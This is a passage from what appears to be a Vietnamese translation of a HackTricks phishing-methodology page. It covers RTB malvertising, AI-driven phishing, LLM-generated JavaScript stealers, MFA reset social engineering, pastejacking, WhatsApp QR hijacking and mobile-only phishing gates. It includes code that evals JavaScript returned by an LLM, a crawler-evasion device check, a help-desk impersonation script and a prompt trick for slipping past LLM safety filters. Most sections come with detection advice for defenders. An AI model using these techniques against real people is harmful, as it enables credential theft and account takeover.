* Defenders có thể tìm các callback HTTP(S) theo dạng `...page.php?tynor=<COMPUTER>sss<USER>` và chu kỳ polling 5 phút sau khi DLL được load.

---

## Malvertising kích hoạt khi hiển thị thông qua RTB

Không giống kết quả tìm kiếm được tài trợ cần có lượt click, quảng cáo RTB có thể load JavaScript của bên thứ ba khi creative được hiển thị trên website hoặc app. Citizen Lab quan sát thấy các ad tag gọi đến một decision server riêng biệt kèm theo advertising identifier. Hầu hết impression nhận được phản hồi trống; một số impression được chọn có thể nhận JavaScript. Vì vậy, phản hồi lành tính khi phát lại không chứng minh rằng mọi người xem đều nhận được cùng một nội dung.<sup>[[14]](#references)</sup>

Đây là một **cơ chế phân phối**, bản thân nó không phải exploit: thực thi JavaScript trong ngữ cảnh hiển thị quảng cáo không tự động cài đặt spyware. Exploit bên dưới của browser hoặc OS không được tiết lộ, vì vậy chỉ riêng một impression quảng cáo hoặc request đến decision server không phải bằng chứng đã bị nhiễm. Để tìm hiểu về khía cạnh liên kết identifier của việc nhắm mục tiêu RTB, xem [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## Các chiến dịch Phishing được tăng cường bằng AI
Attackers hiện kết hợp **API LLM và voice-clone** để tạo các mồi nhử được cá nhân hóa hoàn toàn và tương tác theo thời gian thực.

| Layer | Ví dụ về cách threat actor sử dụng |
|-------|-----------------------------|
|Automation|Tạo và gửi hơn 100 nghìn email / SMS với cách diễn đạt được ngẫu nhiên hóa và tracking link.|
|Generative AI|Tạo email *một lần*, đề cập đến các thương vụ M&A công khai, câu đùa nội bộ trên social media; giả giọng CEO bằng deepfake trong các vụ lừa đảo qua cuộc gọi lại.|
|Agentic AI|Tự động đăng ký domain, thu thập open-source intel, soạn email cho giai đoạn tiếp theo khi nạn nhân click nhưng không gửi thông tin đăng nhập.|

**Biện pháp phòng vệ:**  
• Thêm **dynamic banner** để làm nổi bật các tin nhắn được gửi từ automation không đáng tin cậy (thông qua bất thường ARC/DKIM).  
• Triển khai **cụm từ thử thách sinh trắc học giọng nói** cho các yêu cầu qua điện thoại có rủi ro cao.  
• Liên tục mô phỏng các mồi nhử do AI tạo ra trong chương trình nâng cao nhận thức – template tĩnh đã lỗi thời.

Xem thêm – lạm dụng agentic browsing để phishing thông tin đăng nhập:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Xem thêm – lạm dụng các công cụ CLI cục bộ và MCP của AI agent (để kiểm kê secret và phát hiện):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Lắp ráp JavaScript phishing lúc chạy với sự hỗ trợ của LLM (tạo mã trong browser)

Attackers có thể phát tán HTML trông có vẻ lành tính và **tạo stealer lúc chạy** bằng cách yêu cầu **API LLM đáng tin cậy** viết JavaScript, sau đó thực thi ngay trong browser (ví dụ: `eval` hoặc `<script>` động).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** mã hóa URL exfil/Base64 trong prompt; lặp lại cách diễn đạt để vượt qua bộ lọc an toàn và giảm hiện tượng hallucination.
2. **Lời gọi API phía client:** khi tải trang, JS gọi đến một LLM công khai (Gemini/DeepSeek/etc.) hoặc CDN proxy; chỉ có prompt/lời gọi API xuất hiện trong HTML tĩnh.
3. **Lắp ráp và thực thi:** nối phản hồi lại với nhau rồi thực thi (đa hình theo từng lượt truy cập):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** code được tạo ra cá nhân hóa mồi nhử (ví dụ: phân tích token LogoKit) và gửi creds đến endpoint được ẩn trong prompt.

**Đặc điểm né tránh**
- Traffic đi qua các domain LLM phổ biến hoặc proxy CDN uy tín; đôi khi dùng WebSocket để kết nối đến backend.
- Không có payload tĩnh; JS độc hại chỉ tồn tại sau khi render.
- Các lần tạo không xác định trước tạo ra stealer **duy nhất** cho mỗi session.

**Ý tưởng phát hiện**
- Chạy sandbox có bật JS; đánh dấu `eval` lúc runtime/tạo script động có nguồn từ phản hồi LLM.
- Tìm các POST từ front-end đến API LLM ngay sau đó là `eval`/`Function` trên văn bản trả về.
- Cảnh báo khi có domain LLM không được phê duyệt trong traffic phía client, tiếp theo là các POST chứa thông tin đăng nhập.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Ngoài kiểu push-bombing cổ điển, operator chỉ cần **buộc đăng ký MFA mới** trong cuộc gọi với bộ phận hỗ trợ, vô hiệu hóa token hiện có của người dùng. Mọi lời nhắc đăng nhập tiếp theo đều có vẻ hợp lệ với nạn nhân.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Giám sát các sự kiện AzureAD/AWS/Okta khi **`deleteMFA` + `addMFA`** xảy ra **trong vòng vài phút từ cùng một IP**.



## Clipboard Hijacking / Pastejacking

Kẻ tấn công có thể âm thầm sao chép các lệnh độc hại vào clipboard của nạn nhân từ một trang web bị xâm nhập hoặc giả mạo tên miền, rồi lừa người dùng dán chúng vào **Win + R**, **Win + X** hoặc cửa sổ terminal, thực thi mã tùy ý mà không cần tải xuống hay đính kèm tệp.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Phát tán ứng dụng độc hại (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Chiếm quyền liên kết thiết bị WhatsApp bằng QR qua social engineering
* Một trang dụ nhấp (ví dụ: “kênh” giả mạo của bộ hoặc CERT) hiển thị mã QR WhatsApp Web/Desktop và hướng dẫn nạn nhân quét mã, âm thầm thêm kẻ tấn công làm **thiết bị được liên kết**.<sup>[[12]](#references)</sup>
* Kẻ tấn công lập tức có thể xem các cuộc trò chuyện và danh bạ cho đến khi phiên bị xóa. Nạn nhân có thể thấy thông báo “thiết bị mới được liên kết” sau đó; đội phòng thủ có thể tìm kiếm các sự kiện liên kết thiết bị bất thường ngay sau khi người dùng truy cập các trang QR không đáng tin cậy.

### Phishing giới hạn truy cập trên thiết bị di động để né crawler/sandbox
Các nhóm vận hành ngày càng giới hạn luồng phishing bằng một bước kiểm tra thiết bị đơn giản để crawler trên desktop không bao giờ truy cập được các trang cuối. Một mô hình phổ biến là dùng một script nhỏ kiểm tra DOM có hỗ trợ cảm ứng hay không rồi gửi kết quả đến endpoint của máy chủ; các client không phải thiết bị di động nhận HTTP 500 (hoặc trang trống), trong khi người dùng di động được hiển thị toàn bộ luồng.<sup>[[7]](#references)</sup>

Đoạn client tối giản (logic điển hình):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` logic (đơn giản hóa):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Hành vi máy chủ thường được quan sát:
- Thiết lập cookie phiên trong lần tải đầu tiên.
- Chấp nhận `POST /detect {"is_mobile":true|false}`.
- Trả về 500 (hoặc nội dung giữ chỗ) cho các yêu cầu GET tiếp theo khi `is_mobile=false`; chỉ phân phát nội dung phishing nếu giá trị là `true`.

Heuristic săn tìm và phát hiện:
- Truy vấn urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetry web: chuỗi `GET /static/detect_device.js` → `POST /detect` → HTTP 500 khi thiết bị không phải di động; các đường đi hợp lệ của nạn nhân dùng thiết bị di động trả về 200 cùng HTML/JS tiếp theo.
- Chặn hoặc xem xét kỹ các trang chỉ hiển thị nội dung dựa trên `ontouchstart` hoặc các kiểm tra thiết bị tương tự.

Mẹo phòng thủ:
- Chạy crawler với fingerprint giống thiết bị di động và bật JS để phát hiện nội dung bị ẩn.
- Cảnh báo về các phản hồi 500 đáng ngờ xảy ra sau `POST /detect` trên các domain mới đăng ký.

## References

- [1] [Tạo các biến thể domain được sử dụng trong phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Tìm kiếm phishing: Công cụ và kỹ thuật (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Đánh cắp thông tin xác thực và vượt qua 2FA bằng noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Đánh cắp phiên và vượt qua 2FA bằng EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Cách cài đặt và cấu hình DKIM với Postfix trên Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Báo cáo Ứng phó Sự cố Toàn cầu Unit 42 năm 2025 – Phiên bản Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – hạ tầng phishing giới hạn cho thiết bị di động và các heuristic (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Biên giới tiếp theo của các cuộc tấn công lắp ráp lúc chạy: Tận dụng LLM để tạo JavaScript phishing theo thời gian thực](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Mạo danh, chiếm quyền nhấp chuột và TDS: Bên trong hệ sinh thái phát tán malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Chiếm quyền lưu lượng truy cập đến windows.com của Microsoft bằng cách đảo bit (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Tình yêu? Thật ư: Ứng dụng hẹn hò giả được dùng làm mồi nhử trong chiến dịch spyware có chủ đích tại Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC và mẫu của ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [Vạch trần AdFection: Discover-Tech biến quảng cáo có mục tiêu thành đường dây phát tán spyware đánh thuê zero-click như thế nào](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
